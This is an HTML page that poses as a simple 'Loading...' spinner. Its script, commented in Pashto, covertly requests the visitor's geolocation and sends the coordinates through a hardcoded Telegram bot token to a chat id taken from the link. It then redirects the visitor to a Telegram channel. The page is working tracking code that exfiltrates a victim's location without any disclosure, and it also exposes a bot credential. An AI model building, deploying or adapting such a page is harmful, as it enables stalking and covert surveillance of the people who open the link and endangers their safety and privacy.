<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .loading {
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loading">
        <div class="spinner"></div>
        <p>Loading...</p>
    </div>

    <script>
        // د URL څخه کاروونکي ID ترلاسه کړي
        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        const userId = getUrlParameter('userid');

        // که چیرې userId نه وي، نو چینل ته ډایریکټ کړي
        if (!userId) {
            setTimeout(() => {
                window.location.href = "https://t.me/ProTech43";
            }, 1000);
            exit();
        }

        // د تلیګرام بُوټ API
        const botToken = '8051076844:AAEN0Q6igi5skFgw4f3J7xXF6Cm7WoUNa7E';

        // د لوکیشن ترلاسه کولو او لیږل
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // د تلیګرام ته لوکیشن لیږل
                    const url = `https://api.telegram.org/bot${botToken}/sendLocation`;

                    fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: userId, // د کاروونکي ID څخه کارول
                            latitude: lat,
                            longitude: lon
                        })
                    })
                    .then(() => {
                        // د لیږلو وروسته، چینل ته ډایریکټ کړي
                        setTimeout(() => {
                            window.location.href = "https://t.me/ProTech43";
                        }, 1000);
                    })
                    .catch(() => {
                        // که چیرې لوکیشن لیږل شو ناکام شي، نو هم چینل ته ډایریکټ کړي
                        setTimeout(() => {
                            window.location.href = "https://t.me/ProTech43";
                        }, 1000);
                    });
                },
                function(error) {
                    // که چیرې د لوکیشن ترلاسه کولو کې ستونزه وي، نو هم چینل ته ډایریکټ کړي
                    setTimeout(() => {
                        window.location.href = "https://t.me/ProTech43";
                    }, 1000);
                }
            );
        } else {
            // که چیرې جیو لوکیشن ناکارول شي، نو چینل ته ډایریکټ کړي
            setTimeout(() => {
                window.location.href = "https://t.me/ProTech43";
            }, 1000);
        }
    </script>

</body>
</html>
